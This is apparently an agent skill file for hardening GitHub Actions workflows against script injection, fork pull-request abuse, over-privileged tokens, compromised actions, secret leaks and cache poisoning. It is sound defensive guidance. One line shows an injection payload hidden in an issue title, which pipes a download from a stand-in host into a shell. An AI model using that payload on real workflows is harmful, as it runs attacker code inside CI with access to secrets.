---
name: gha-security-hardening
description: Hardens GitHub Actions workflows against script injection, pwn requests from forks, over-privileged GITHUB_TOKEN, compromised third-party actions, cache and artifact poisoning, and secret leaks. Gives the exact fix for each pattern. Use when writing or reviewing workflows that use pull_request_target, workflow_run, issue_comment or other untrusted input, that hold secrets or write permissions, or when asked to audit or lock down CI.
license: MIT
---

# Hardening GitHub Actions

Apply every rule below to any workflow you write or touch. Then run `zizmor .github/workflows` and `actionlint` if available, and fix what they report.

## 1. Script injection

Any `${{ }}` inside `run:` is pasted into the script before the shell parses it. An issue titled `a"; curl evil.sh | sh; echo "` runs.

Attacker-controlled: `github.event.issue.title/body`, `github.event.pull_request.title/body`, `github.event.comment.body`, `github.event.review.body`, `github.head_ref`, `github.event.pull_request.head.ref`, `github.event.pull_request.head.label`, commit messages and author names, `github.event.pages.*.page_name`, and any `inputs.*` reachable by an untrusted caller.

```yaml
# wrong
- run: echo "Title: ${{ github.event.pull_request.title }}"
# right
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```

Same rule for `actions/github-script`: read `context.payload` or `process.env`, never template into `script:`.

## 2. Least-privilege token

```yaml
permissions: {}          # workflow level: nothing
jobs:
  build:
    permissions:
      contents: read     # grant per job
```

- Specifying any scope sets the rest to `none`. A job doing OIDC needs `id-token: write` and still needs `contents: read` for checkout.
- Repository setting "Workflow permissions" should be read-only; the workflow then opts into writes per job.
- `actions/checkout` keeps the token on disk for later steps unless `persist-credentials: false`. Set it in every job that does not push.

## 3. Untrusted code with privileges

| Trigger | Runs workflow from | Secrets | Token |
| - | - | - | - |
| `pull_request` from fork | PR merge commit | none | read-only |
| `pull_request_target` | default branch | yes | write possible |
| `workflow_run` | default branch | yes | write possible |
| `issue_comment` | default branch | yes | write possible |

Rules:

- `pull_request_target`, `workflow_run` and `issue_comment` must never build, install, test or execute PR code. `npm install`, `make`, `pip install .` and pre-commit hooks all execute it.
- `actions/checkout` refuses to check out fork PR code in `pull_request_target` and PR-triggered `workflow_run`: v7, plus the floating `v4`, `v5` and `v6` tags since July 20, 2026 (v4.4.0, v5.1.0, v6.1.0). SHA, minor or patch pins to older releases have no protection; update them. Do not add `allow-unsafe-pr-checkout: true` to get around it, and do not bypass it with `git fetch origin pull/N/head` or `gh pr checkout` in a `run:` step; neither is covered by the protection.
- To comment on or label PRs with results, split it: `pull_request` builds and uploads an artifact, a `workflow_run` job with write permission downloads it and treats every byte as untrusted data (validate numbers, never `eval`, never extract archives into the workspace root).
- `issue_comment` commands (`/deploy`) must check `github.event.comment.author_association` is `OWNER`, `MEMBER` or `COLLABORATOR`, and must then act on a SHA, not a branch name that can move.
- Gate deploys from untrusted triggers with an `environment` that has required reviewers.

## 4. Third-party actions

- Pin by full commit SHA with the version as a comment: `uses: some/action@8f4b7f84864484a7bf31766abe9204da3cbe65b3 # v3.1.0`. Tags are mutable; the March 2025 tj-actions/changed-files compromise rewrote every tag to exfiltrate secrets.
- Keep pins current with Dependabot (`package-ecosystem: github-actions`); it updates SHA and comment together.
- Org/repo setting "Require actions to be pinned to a full-length commit SHA" enforces this.
- First-party `actions/*` on a major tag is acceptable risk for many teams; anything that touches secrets or release artifacts gets a SHA.
- Prefer a few lines of `run:` with the `gh` CLI over an unknown action for trivial tasks.

## 5. Secrets

- Pass secrets to steps through `env:` on the step that needs them, not job or workflow level.
- Redaction works on exact strings. Structured secrets (a JSON blob) are not reliably redacted when a field is printed alone; store one value per secret. Derived values (base64, URL-encoded, substrings) are never masked; run `echo "::add-mask::$DERIVED"` before anything can print them.
- Never `set -x` in a step holding secrets.
- Prefer OIDC to long-lived cloud keys; see the gha-oidc-cloud-auth skill.
- Dependabot-triggered runs get Dependabot secrets only, never Actions secrets.

## 6. Caches and artifacts

- Caches written on the default branch are readable by every branch and PR. A job that runs untrusted code must never be able to write a cache that privileged jobs restore. Avoid caches in release jobs entirely; build them from a clean install.
- `setup-node` and friends cache automatically in some cases; set `package-manager-cache: false` (setup-node) in release and deploy jobs.
- Artifacts from a PR run are attacker-controlled. Download to `${{ runner.temp }}` and parse as data.

## 7. Runners

- Never attach self-hosted runners to public repositories; any fork PR can run on them.
- Use ephemeral (`--ephemeral`) self-hosted runners so one job cannot persist into the next.

Concrete before/after rewrites for each trigger: [references/untrusted-triggers.md](references/untrusted-triggers.md).
